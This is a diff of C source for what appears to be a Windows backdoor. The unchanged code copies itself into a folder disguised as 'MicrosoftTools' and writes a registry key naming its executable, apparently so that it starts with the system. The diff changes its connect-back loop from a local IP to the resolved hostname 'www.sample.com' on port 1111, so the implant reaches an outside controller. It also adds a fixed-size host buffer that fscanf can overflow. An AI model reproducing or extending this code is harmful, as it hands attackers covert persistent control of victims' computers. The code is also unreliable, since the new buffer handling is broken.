@@ -5,8 +5,8 @@
 #include "EA_Socket.h"
 #include "process.h"
 
-int port = 5005;
-char ip[16] = "127.0.0.1";
+int port = 1111;
+char host[] = "www.sample.com";
 char lastFolderName[60] = "MicrosoftTools";
 
 static void defect(void);
@@ -69,6 +69,7 @@ static void defect(void)
 		onlyRunCommand(command);
 
 		sprintf(command, "%s\\%s", targetPath, srcPathwithName + i + 1);
+
 		HKEY hKey;
 		char * czStartName = srcPathwithName + i + 1;
 		char * czExePath   = command;
@@ -103,19 +104,29 @@ static void lifeOnSystem(void)
 {
 	char * al;
 	SOCKET sckt;
+    struct hostent * he;
 	int de, check = 0, yes = 1;
 	struct sockaddr_in veriler;
+    struct in_addr ** addr_list;
 
 	readIpPortFromFile();
+
+	while((he = gethostbyname(host)) == NULL)
+	{
+		Sleep(500);
+	}
+
+	addr_list = (struct in_addr **)he->h_addr_list;
 
 	while (1)
 	{
 		sckt = socket(AF_INET, SOCK_STREAM, 0);
 		setsockopt(sckt, SOL_SOCKET, SO_REUSEADDR, (char * )&yes, sizeof(int));
 
+
 		veriler.sin_family = AF_INET;
 		veriler.sin_port = htons(port);
-		veriler.sin_addr.s_addr = inet_addr(ip);
+		veriler.sin_addr.s_addr = inet_addr(inet_ntoa(*addr_list[0]));
 		memset(veriler.sin_zero, 0, 8);
 
 		if (sckt != INVALID_SOCKET && sckt != SOCKET_ERROR)
@@ -190,7 +201,7 @@ static void readIpPortFromFile(void)
 
 	if (fIpPort != NULL)
 	{
-		fscanf(fIpPort,"%s %d", ip, &port);
+		fscanf(fIpPort,"%s %d", host, &port);
 		fclose(fIpPort);
 	}
 }
